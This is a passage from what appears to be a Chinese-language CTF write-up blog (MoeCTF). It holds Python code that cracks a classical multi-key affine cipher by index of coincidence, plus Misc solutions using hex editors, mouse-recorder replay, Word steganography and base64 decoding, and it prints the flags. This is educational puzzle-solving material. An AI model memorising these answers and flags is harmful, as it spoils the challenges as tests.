number\">0.065</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token builtin\">sum</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>dic_index <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0.08167</span><span class=\"token punctuation\">,</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0.01492</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0.02782</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.04253</span><span class=\"token punctuation\">,</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0.12702</span><span class=\"token punctuation\">,</span><span class=\"token string\">'f'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.02228</span><span class=\"token punctuation\">,</span><span class=\"token string\">'g'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0.02015</span><span class=\"token punctuation\">,</span><span class=\"token string\">'h'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.06094</span><span class=\"token punctuation\">,</span><span class=\"token string\">'i'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.06966</span><span class=\"token punctuation\">,</span><span class=\"token string\">'j'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.00153</span><span class=\"token punctuation\">,</span><span class=\"token string\">'k'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.00772</span><span class=\"token punctuation\">,</span><span class=\"token string\">'l'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.04025</span><span class=\"token punctuation\">,</span><span class=\"token string\">'m'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.02406</span><span class=\"token punctuation\">,</span><span class=\"token string\">'n'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.06749</span><span class=\"token punctuation\">,</span><span class=\"token string\">'o'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.07507</span><span class=\"token punctuation\">,</span><span class=\"token string\">'p'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.01929</span><span class=\"token punctuation\">,</span><span class=\"token string\">'q'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.00095</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.05987</span><span class=\"token punctuation\">,</span><span class=\"token string\">'s'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.06327</span><span class=\"token punctuation\">,</span><span class=\"token string\">'t'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.09056</span><span class=\"token punctuation\">,</span><span class=\"token string\">'u'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.02758</span><span class=\"token punctuation\">,</span><span class=\"token string\">'v'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.00978</span><span class=\"token punctuation\">,</span><span class=\"token string\">'w'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.02360</span><span class=\"token punctuation\">,</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.00150</span><span class=\"token punctuation\">,</span><span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.01974</span><span class=\"token punctuation\">,</span><span class=\"token string\">'z'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0.00074</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">IndCo</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\"># 计算字符串的重合指数（所有字母出现频率的平方和）</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\"># 输入 s </span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token comment\"># 输出 重合指数</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    alpha <span class=\"token operator\">=</span> <span class=\"token string\">'abcdefghijklmnopqrstuvwxyz'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    freq <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> alpha<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        freq<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        freq<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span>  freq<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    index <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> alpha<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        index <span class=\"token operator\">=</span> index <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>freq<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>freq<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> index</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">IndCo_m</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token comment\"># 计算明文 s 中的各字母频率和英文字母中的频率吻合程度</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token comment\"># 输入：明文 s</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token comment\"># 输出：吻合程度</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    alpha <span class=\"token operator\">=</span> <span class=\"token string\">'abcdefghijklmnopqrstuvwxyz'</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    freq <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> alpha<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        freq<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        freq<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    index <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> alpha<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        index <span class=\"token operator\">+=</span> freq<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">/</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> dic_index<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">return</span> index</pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_keylen</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token comment\"># 求出最符合统计学的 m,n 的最小公倍数，方法通过爆破足够大的周期样本，观察成倍出现的周期</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token comment\"># 计算方法是解出每一个子密文段的重合指数然后求平均值 在和最佳重合指数相减 误差小于 0.01</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token comment\"># 输入：密文</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token comment\"># 输出：公共周期列表</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    keylen <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        average_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            s <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">[</span>j<span class=\"token operator\">+</span>i<span class=\"token operator\">*</span>x<span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            index <span class=\"token operator\">=</span> IndCo<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            average_index<span class=\"token operator\">+=</span>index</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        average_index <span class=\"token operator\">=</span> average_index<span class=\"token operator\">/</span>i <span class=\"token operator\">-</span> best_index</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span>average_index<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token number\">0.01</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            keylen<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">return</span> keylen</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>keylen <span class=\"token operator\">=</span> get_keylen<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>keylen<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\">#____________________________得到 keylen_____________________________#</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\">#____________________________爆破 flag———————————————————————————————#</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    alpha <span class=\"token operator\">=</span> <span class=\"token string\">'abcdefghijklmnopqrstuvwxyz'</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    m <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> c<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        m <span class=\"token operator\">+=</span> alpha<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>alpha<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>j<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">return</span> m </pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_key</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token comment\"># 得到一个密文段的单个字符 key .i .j</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token comment\"># 暴力枚举，找到最符合的</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token comment\"># 输入：密文段</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token comment\"># 输出：i,j</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        <span class=\"token keyword\">if</span> gmpy2<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>            m <span class=\"token operator\">=</span> decrypt<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>            index <span class=\"token operator\">=</span> IndCo_m<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span>index<span class=\"token operator\">-</span><span class=\"token number\">0.065</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token number\">0.01</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_all_key</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span>keylen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token comment\"># 得到一个周期内所有密文段的 key</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token comment\"># 输入：原密文，周期</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token comment\"># 输出：无</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>keylen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        temps <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span>x<span class=\"token operator\">*</span>keylen<span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>keylen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>get_key<span class=\"token punctuation\">(</span>temps<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>get_all_key<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>keylen<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token comment\"># 于是就可以分析得到 ka = []  kb= []</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token comment\"># 例如：(23, 9)(25, 21)(21, 9)(3, 10)(19, 16)(23, 3)(25, 22)(21, 13)(3, 14)(19, 21)(23, 15)(25, 9)(21, 21)(3, 9)(19, 10)(23, 16)(25, 3)(21, 22)(3, 13)(19, 14)(23, 21)(25, 15)(21, 9)(3, 21)(19, 9)(23, 10)(25, 16)(21, 3)(3, 22)(19, 13)(23, 14)(25, 21)(21, 15)(3, 9)(19, 21)(23, 9)(25, 10)(21, 16)(3, 3)(19, 22)(23, 13)(25, 14)(21, 21)(3, 15)(19, 9)(23, 21)(25, 9)(21, 10)(3, 16)(19, 3)(23, 22)(25, 13)(21, 14)(3, 21)(19, 15)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token comment\"># 那么得到就是 k1=[23,25,21,3,19],k2=[9,21,9,10,16,3,22,13,14,21,15]</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> hashlib <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>k1<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">19</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>k2<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span><span class=\"token number\">19</span><span class=\"token punctuation\">,</span><span class=\"token number\">18</span><span class=\"token punctuation\">,</span><span class=\"token number\">19</span><span class=\"token punctuation\">,</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'c.txt'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>c <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>plaintext <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>l1 <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>l2 <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>k2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>alpha<span class=\"token operator\">=</span><span class=\"token string\">'abcdefghijklmnopqrstuvwxyz'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    plaintext<span class=\"token operator\">+=</span>alpha<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>alpha<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>k2<span class=\"token punctuation\">[</span>i<span class=\"token operator\">%</span>l2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>k1<span class=\"token punctuation\">[</span>i<span class=\"token operator\">%</span>l1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>plaintext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    a<span class=\"token operator\">=</span>plaintext<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    b<span class=\"token operator\">=</span>a<span class=\"token operator\">+</span><span class=\"token string\">'How_Interesting_the_Cryptography_Is'</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>md5<span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token string\">'196cf7098c7ea6e3e4d03691fb9d4f58'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#moectf&#123;pieceofchocolate&#125;</span></pre></td></tr></table></figure><hr />\n<h1 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h1>\n<h2 id=\"find_me\"><a class=\"anchor\" href=\"#find_me\">#</a> <strong>find_me</strong></h2>\n<p>把文件拖进<em><strong> 010editor</strong></em> 进行查看，Flag 跃然于右边的文本 (之前都用的 winhex, 没想到<em><strong> 010edito</strong></em>r 又经济又实惠，hs yyds)</p>\n<p><code>moectf&#123;hs_g1v3_u_fl@g&#125;</code></p>\n<h2 id=\"macross\"><a class=\"anchor\" href=\"#macross\">#</a> <strong>Macross</strong></h2>\n<p>打开是一个以<strong> mrf</strong> 为后缀名的文件，用百度搜了很久一直说是和 mac 系统相关连的文件格式，然后下了<em> Fileview</em> 查看，看了个寂寞，<s>只有我浪费了精力和希望，百度得了流量</s> 然后上 Google 搜到是记录鼠标行为的数据文件 (<em>An MRF file is a data file created by Bartels Media Mouse Recorder</em>)，并找到下载相应的软件 <code>MacrossRecorder</code> ，然后打开 Windows 画图，运行文件并记录轨迹</p>\n<p><code>moectf&#123;Rec0rder_15_Funny&#125;</code></p>\n<h2 id=\"homework\"><a class=\"anchor\" href=\"#homework\">#</a> <strong>Homework</strong></h2>\n<p>大致按照 word 隐写的流程走一下，将字体全调成红色，发现有一处有重叠的字符，直接复制然后找一个文本框得出 <code>flag&#123;0h_U_</code> ，调整阅读视图或者在 kali 中打开发现了 <code>f1nd_m3!&#125;</code>  的文本 (或者清除格式也能看到), 最终得到 Flag</p>\n<p><img data-src=\"https://i.loli.net/2021/09/24/9OfBvmqDg6GWrHe.png\" alt=\"image-20210924151122930\" /></p>\n<p><img data-src=\"https://i.loli.net/2021/09/24/KysmEInGoabUqVM.png\" alt=\"\" /></p>\n<p><code>moectf&#123;0h_U_f1nd_m3!&#125;</code></p>\n<h2 id=\"flipflipflip\"><a class=\"anchor\" href=\"#flipflipflip\">#</a> <strong>flipflipflip</strong></h2>\n<p>打开文件发现末尾是 <code>=</code> ，可能用到了 base64 编码，因文件较大，复制粘贴会卡，选用 python 做题</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'task'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>content <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>对 content 第一次解码，查看头尾</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>content <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>decodebytes<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># b'=0DME1URxU'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span 